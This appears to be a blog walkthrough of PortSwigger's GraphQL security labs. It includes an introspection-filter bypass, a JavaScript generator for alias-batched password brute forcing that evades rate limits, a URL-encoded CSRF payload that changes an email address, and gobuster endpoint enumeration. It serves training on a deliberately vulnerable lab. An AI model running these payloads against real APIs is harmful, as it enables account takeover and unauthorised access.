---
layout: single
title: GraphQL - PortSwigger
excerpt: "All GraphQL API vulnerabilities labs of PortSwigger."
date: 2025-10-06
classes: wide
header:
  teaser: /img2/images/portswigger.png
  teaser_home_page: true
  icon: /img2/images/burp.jpg
categories:
  - portswigger
  - Web
tags:
  - Burpsuite
  - GraphQL
---


## TIPS

- Introspection query

![](/img2/Pasted%20image%2020251006184953.png)

![](/img2/Pasted%20image%2020251006185024.png)

```json
- QUERY -

query($id: Int!) {
  getUser(id: $id) {
    id
    username
    password
  }
}

- VARIABLE -
  
{
	"id":1
}
```

- Bypass `__schema{` regex validation

```http
query IntrospectionQuery {
    __schema   
     {
	...
```

- Brute Force with aliases

```javascript
- BROWSER CONSOLE -

copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```

```http
mutation {

bruteforce0:login(input:{password: "123456", username: "carlos"}) {
        token
        success
    }


bruteforce1:login(input:{password: "password", username: "carlos"}) {
        token
        success
    }
}
```

- CSRF with Content-Type conversion (x-www-form-urlencoded)

```http
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```

## Accessing private GraphQL posts

![](/img2/Pasted%20image%2020251006170045.png)

![](/img2/Pasted%20image%2020251006170324.png)

> We run the introspection query and we see a hidden field in the response.

![](/img2/Pasted%20image%2020251006170510.png)

> In the getBlogPost query we add the hidden field postPassword.

## Accidental exposure of private GraphQL fields

![](/img2/Pasted%20image%2020251006174635.png)

![](/img2/Pasted%20image%2020251006174208.png)

> Once the introspection query is executed we can send the query to the site map.

![](/img2/Pasted%20image%2020251006174601.png)

> Inside the site map we see a query called getUser.

![](/img2/Pasted%20image%2020251006174723.png)

## Finding a hidden GraphQL endpoint

```bash
❯ gobuster dir -u https://0a9e00d404ff3a9c8a733076007e005b.web-security-academy.net/ -w BSCP/burp-paths.txt -t 20
```

```ruby
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://0a9e00d404ff3a9c8a733076007e005b.web-security-academy.net/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                BSCP/burp-paths.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api                  (Status: 400) [Size: 19]
/logout               (Status: 302) [Size: 0] [--> /]
/my-account           (Status: 302) [Size: 0] [--> /login]
/resources/images/tracker.gif (Status: 200) [Size: 42]
/login                (Status: 200) [Size: 3124]
/filter               (Status: 200) [Size: 10736]
/product              (Status: 400) [Size: 30]
Progress: 279 / 280 (99.64%)
===============================================================
Finished
===============================================================
```

> We fuzz directories and find the `/api` directory.

![](/img2/Pasted%20image%2020251006182819.png)

> We detect the use of GraphQL.

![](/img2/Pasted%20image%2020251006183224.png)

> When trying to run the introspection query we see some kind of validation is being applied.

![](/img2/Pasted%20image%2020251006184006.png)

> To bypass the validation we add a newline before the { so that we bypass the regex validation `__schema{`

![](/img2/Pasted%20image%2020251006184243.png)

> We send the introspection query to the site map and we see an interesting function.

![](/img2/Pasted%20image%2020251006184317.png)

## Bypassing GraphQL brute force protections

![](/img2/Pasted%20image%2020251006195620.png)

> We send the introspection query to the site map and we see a login query.

![](/img2/Pasted%20image%2020251006195733.png)

> When sending multiple requests we are rate limited. This complicates the ability to brute force.

![](/img2/Pasted%20image%2020251006195859.png)

> However, in GraphQL we can send multiple requests in one using aliases.

![](/img2/Pasted%20image%2020251006200014.png)

![](/img2/Pasted%20image%2020251006200112.png)

> Using a small JavaScript script we generate several aliases and send them in the same request.

## Performing CSRF exploits over GraphQL

![](/img2/Pasted%20image%2020251006202839.png)

> We see a request to change the email in a GraphQL API. Using JSON syntax we could not exploit the CSRF.

![](/img2/Pasted%20image%2020251006212415.png)

> We generate a PoC using Burp Suite and send it to the victim.